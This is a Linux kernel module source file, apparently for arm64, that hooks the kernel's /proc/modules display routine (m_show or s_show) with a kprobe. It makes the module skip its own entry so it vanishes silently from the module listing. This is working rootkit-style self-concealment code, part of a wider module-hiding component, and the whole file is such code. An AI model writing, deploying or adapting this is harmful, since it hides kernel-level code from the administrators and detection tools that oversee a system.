// SPDX-License-Identifier: GPL-2.0-only
// C.1: /proc/modules seq_file scrub — defence in depth after conceal_module().
// Handles both the modern m_show and the legacy s_show name.

#include <linux/errno.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/types.h>

#include "kallsym.h"
#include "log.h"
#include "module_hide.h"

static struct kprobe kp_m_show;
static bool armed;

/* m_show(m, p): p is struct list_head* — reach struct module via list_entry, no p deref. */
static int m_show_pre(struct kprobe *p, struct pt_regs *regs) {
	struct list_head *lh;
	struct module *mod;

	(void)p;
	if (!regs)
		return 0;
	lh = (struct list_head *)regs->regs[1];
	if (!lh)
		return 0;
	mod = list_entry(lh, struct module, list);
	if (mod != THIS_MODULE)
		return 0;

	/* Skip original; return 0 so seq_file marks the entry emitted silently. */
	regs->regs[0] = 0;
	instruction_pointer_set(regs, procedure_link_pointer(regs));
	return 1;
}

int module_hide_arm(void) {
	unsigned long addr;
	int rc;

	if (armed)
		return 0;

	addr = kallsym_lookup("m_show");
	if (!addr)
		addr = kallsym_lookup("s_show");
	if (!addr) {
		LOGN("module_hide: neither m_show nor s_show in kallsyms\n");
		return -ENOENT;
	}

	memset(&kp_m_show, 0, sizeof(kp_m_show));
	kp_m_show.addr = (kprobe_opcode_t *)addr;
	kp_m_show.pre_handler = m_show_pre;
	rc = register_kprobe(&kp_m_show);
	if (rc) {
		LOGE("module_hide: register_kprobe failed: %d\n", rc);
		return rc;
	}
	armed = true;
	LOGI("module_hide: /proc/modules scrub armed @ %px\n", (void *)addr);
	return 0;
}

void module_hide_disarm(void) {
	if (!armed)
		return;
	unregister_kprobe(&kp_m_show);
	armed = false;
}
